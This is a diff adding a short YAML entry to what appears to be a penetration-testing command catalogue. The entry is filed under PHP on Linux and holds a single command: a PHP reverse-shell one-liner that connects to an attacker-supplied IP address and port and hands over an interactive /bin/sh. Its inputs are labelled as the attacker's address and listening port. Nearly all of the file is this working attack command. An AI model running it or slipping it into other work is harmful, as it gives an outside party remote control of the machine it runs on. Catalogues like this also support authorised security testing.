@@ -1,0 +1,15 @@
+---
+name: php
+description: A general-purpose scripting language commonly used for web development
+os: Linux
+ptf_module: null
+---
+commands:
+  - "Reverse Shell (/bin/sh)":
+    - type: ["other","NX"]
+    - text: "php -r '$sock=fsockopen(\"{IPV4}\",{INT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+    - input: ["attacker IPv4 address","attacker listening TCP port"]
+    - output: null
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+...
